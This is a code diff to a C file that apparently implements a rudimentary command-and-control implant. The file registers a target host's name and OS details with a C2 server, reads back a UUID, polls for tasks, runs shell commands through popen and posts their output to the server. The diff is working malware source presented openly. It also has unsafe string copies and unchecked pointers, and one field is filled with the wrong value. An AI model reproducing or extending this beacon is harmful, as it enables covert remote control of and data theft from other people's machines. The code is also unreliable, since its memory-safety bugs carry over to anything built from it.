@@ -10,15 +10,19 @@
 #include <sys/utsname.h>
 #include "initiate.h"
 #include "curl_utils.h"
+#include "host_utils.h"
 
-//ref https://curl.se/libcurl/c/postit2.html
+#define UUIDLEN 36
+
+// ref https://curl.se/libcurl/c/postit2.html
 
 static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp);
 
 bool get_host_info(struct agent_info *agent)
 {
 	// Get target hostname.
-	if (gethostname(agent->hostname, sizeof(agent->hostname)) == -1) {
+	if (gethostname(agent->hostname, sizeof(agent->hostname)) == -1)
+	{
 		perror("Error acquiring host name.\n");
 		return false;
 	}
@@ -26,80 +30,68 @@ bool get_host_info(struct agent_info *agent)
 	// Get target OS and version.
 	struct utsname buf;
 	errno = 0;
-	if (uname(&buf) != 0) {
+	if (uname(&buf) != 0)
+	{
 		perror("uname error\n");
 		return false;
 	}
 
-	strncpy(agent->os_type, buf.nodename, sizeof(buf.nodename) +1);
+	strncpy(agent->os_type, buf.nodename, sizeof(buf.nodename) + 1);
+	strncpy(agent->os_version, buf.version, sizeof(buf.version) + 1);
 
-	strncpy(agent->os_version, buf.version, sizeof(buf.version) +1);
-
-
+	return true;
 }
 
-bool reg(void)
+bool reg(struct agent_info *agent, struct strings_array *sa)
 {
-	struct response chunk = {.memory = NULL, .size = 0};
-    struct web_comms web = {NULL, 0, NULL};
 
-    if(!curl_prep(&web)) {
-        perror("curl_prep failed\n");
-        exit(1);
-    }
+	// struct strings_array chunk = {.response = NULL, .size = 0};
+	struct web_comms web = {NULL, 0, NULL};
 
-	// Get target hostname.
-	// TO DO figure out how to import HOST_NAME_MAX
-	char hostbuf[256];
-	if (gethostname(hostbuf, sizeof(hostbuf)) == -1) {
-		perror("Error acquiring host name.\n");
-		return false;
+	if (!curl_prep(&web))
+	{
+		perror("curl_prep failed\n");
+		exit(1);
 	}
 
-	add_curl_field(web.form, "hostname", hostbuf);
-
-	// Get target OS and version and pass to add_curl_field.
-	struct utsname buf1;
-	errno = 0;
-	if (uname(&buf1) != 0) {
-		perror("uname error\n");
-		return false;
-	}
-
-	add_curl_field(web.form, "os type", buf1.nodename);
-	add_curl_field(web.form, "os version", buf1.version);
-
-	// Add submit options to curl field data.
+	add_curl_field(web.form, "hostname", agent->hostname);
+	add_curl_field(web.form, "os type", agent->os_type);
+	add_curl_field(web.form, "os version", agent->os_version);
 	add_curl_field(web.form, "submit", "send");
 
-	//Registration URL
+	// Registration URL
 	const char regurl[19] = "127.0.0.1:9000/reg";
-
 	curl_easy_setopt(web.curl, CURLOPT_URL, regurl);
 
+	// Set options for POST
 	curl_easy_setopt(web.curl, CURLOPT_MIMEPOST, web.form);
 
-	// Send data to this function as opposed to writing to stdout.
+	// Send data to mem_cb function as opposed to writing to stdout.
 	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);
 
 	// Pass chunk to callback function.
-	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)&chunk);
+	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)sa);
 
 	// Perform the request, res will get the return code
 	web.res = curl_easy_perform(web.curl);
 
-	printf("The data returning from agent registration is %s\n\n", chunk.memory);
+	char *ret;
+
+	// Strchr for @, as the c2 server precedes the UUID with the @ character.
+	ret = strchr(sa->response, '@');
+
+	// Move pointer to the right one (ret +1) to copy UUID after the @ char.
+	strncpy(agent->uuid, ret + 1, UUIDLEN);
 
 	// Check for errors
-	if (web.res != CURLE_OK) {
-		fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(web.res));
+	if (web.res != CURLE_OK)
+	{
+		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(web.res));
 		return false;
 	}
 
 	// Always cleanup.
 	curl_easy_cleanup(web.curl);
-
-	free(chunk.memory);
 
 	// Then cleanup the form.
 	curl_mime_free(web.form);
@@ -111,49 +103,51 @@ bool reg(void)
 // Ref: https://everything.curl.dev/libcurl/callbacks/write
 static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp)
 {
-  size_t realsize = size * nmemb;
-  struct response *mem = (struct response *)userp;
+	size_t realsize = size * nmemb;
+	struct strings_array *mem = (struct strings_array *)userp;
 
-  char *ptr = realloc(mem->memory, mem->size + realsize + 1);
-  if(!ptr) {
-    /* out of memory! */
-    printf("not enough memory (realloc returned NULL)\n");
-    return 0;
-  }
+	char *ptr = realloc(mem->response, mem->size + realsize + 1);
+	if (!ptr)
+	{
+		/* out of memory! */
+		printf("not enough memory (realloc returned NULL)\n");
+		return 0;
+	}
 
-  mem->memory = ptr;
-  memcpy(&(mem->memory[mem->size]), contents, realsize);
-  mem->size += realsize;
-  mem->memory[mem->size] = 0;
+	mem->response = ptr;
+	memcpy(&(mem->response[mem->size]), contents, realsize);
+	mem->size += realsize;
+	mem->response[mem->size] = 0;
 
-//   printf("The data in the function is %s\n\n", mem->memory);
+	//   printf("The data in the function is %s\n\n", mem->memory);
 
-  return realsize;
+	return realsize;
 }
 
 bool check_tasks(void)
 {
-	struct response chunk = {.memory = malloc(0), .size = 0};
+	struct strings_array chunk = {.response = malloc(0), .size = 0};
 
 	CURL *curl = curl_easy_init();
 
-	if (!curl) {
+	if (!curl)
+	{
 		fprintf(stderr, "Curl init failed\n");
 		return 1;
 	}
 	// set options / perfour action is the typical pattern seen with curl in C.
 	// Param 1 is the curl handle created before.
 	// Param 2 is CURLOPT_URL, which then allows you to specify the URL in
-	// param 3 that you want download. 
+	// param 3 that you want download.
 	curl_easy_setopt(curl, CURLOPT_URL, "127.0.0.1:9000/tasks/uuid");
 
 	// This line below specifies what to do with the data when we receive it,
 	// as opposed to printing it to stdout. We will pass in a ptr to our own function
 	// called got_data in this example. This is known as a call back function.
-		// Send data to this function as opposed to writing to stdout.
+	// Send data to this function as opposed to writing to stdout.
 	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, mem_cb);
 
-		// Pass chunk to callback function.
+	// Pass chunk to callback function.
 	curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
 
 	// set options
@@ -163,35 +157,79 @@ bool check_tasks(void)
 	// CURLcode resul saves the return code from curl_easy_perform.
 	CURLcode result = curl_easy_perform(curl);
 
-  	printf("The data returning from check tasks is %s\n\n", chunk.memory);
+	printf("The data returning from check tasks is %s\n\n", chunk.response);
 
-	if (result != CURLE_OK) {
+	if (result != CURLE_OK)
+	{
 		fprintf(stderr, "download problem: %s\n",
-			curl_easy_strerror(result));
+				curl_easy_strerror(result));
 	}
 
 	curl_easy_cleanup(curl);
 	return 0;
 }
 
+// Executes a given task.
+// ref: https://www.linuxquestions.org/questions/linux-newbie-8/
+// help-in-getting-return-status-of-popen-sys-call-870219/
+bool run_cmd(struct strings_array *sa)
+{
+	// Allocates space for array to a size of cap (1) * size of char, as size
+	// of file is unknown. When memory runs out realloc() will allocate
+	// additional memory later in word_extract(). */
+
+	FILE *cmd_fptr = NULL;
+	char line[1024] = {'\0'};
+	int cmd_ret = 0;
+	size_t cur_len = 0;
+
+	if ((cmd_fptr = popen("ip addr", "r")) != NULL)
+	{
+		while (fgets(line, sizeof(line), cmd_fptr) != NULL)
+		{
+			size_t buf_len = strlen(line);
+			char *tmp_space = realloc(sa->results, buf_len + cur_len + 1);
+			if (!tmp_space)
+			{
+				perror("Unable to resize.\n");
+				fclose(cmd_fptr);
+				free(sa->results);
+				return false;
+			}
+			sa->results = tmp_space;
+			strncpy(sa->results + cur_len, line, buf_len);
+			cur_len += buf_len;
+		}
+	}
+	cmd_ret = pclose(cmd_fptr);
+	printf("The exit status is: %d\n", WEXITSTATUS(cmd_ret));
+	if (cmd_ret != 0)
+	{
+		return false;
+	}
+
+	return true;
+}
+
 bool post_results(struct strings_array *sa)
 {
-	struct response chunk = {.memory = malloc(0), .size = 0};
-    struct web_comms web = {NULL, 0, NULL};
+	struct strings_array chunk = {.response = malloc(0), .size = 0};
+	struct web_comms web = {NULL, 0, NULL};
 
-    if(!curl_prep(&web)) {
-        perror("curl_prep failed\n");
-        exit(1);
-    }
+	if (!curl_prep(&web))
+	{
+		perror("curl_prep failed\n");
+		exit(1);
+	}
 
 	add_curl_field(web.form, "task id", "1234");
 
-	add_curl_field(web.form, "task results", sa->words);
+	add_curl_field(web.form, "task results", sa->results);
 
 	// Add submit options to curl field data.
 	add_curl_field(web.form, "submit", "send");
 
-	//Registration URL
+	// Registration URL
 	const char resurl[27] = "127.0.0.1:9000/results/uuid";
 
 	curl_easy_setopt(web.curl, CURLOPT_URL, resurl);
@@ -207,18 +245,19 @@ bool post_results(struct strings_array *sa)
 	// Perform the request, res will get the return code
 	web.res = curl_easy_perform(web.curl);
 
-	printf("The data returning from post results is %s\n\n", chunk.memory);
+	printf("The data returning from post results is %s\n\n", chunk.response);
 
 	// Check for errors
-	if (web.res != CURLE_OK) {
-		fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(web.res));
+	if (web.res != CURLE_OK)
+	{
+		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(web.res));
 		return false;
 	}
 
 	// Always cleanup.
 	curl_easy_cleanup(web.curl);
 
-	free(chunk.memory);
+	free(chunk.response);
 
 	// Then cleanup the form.
 	curl_mime_free(web.form);
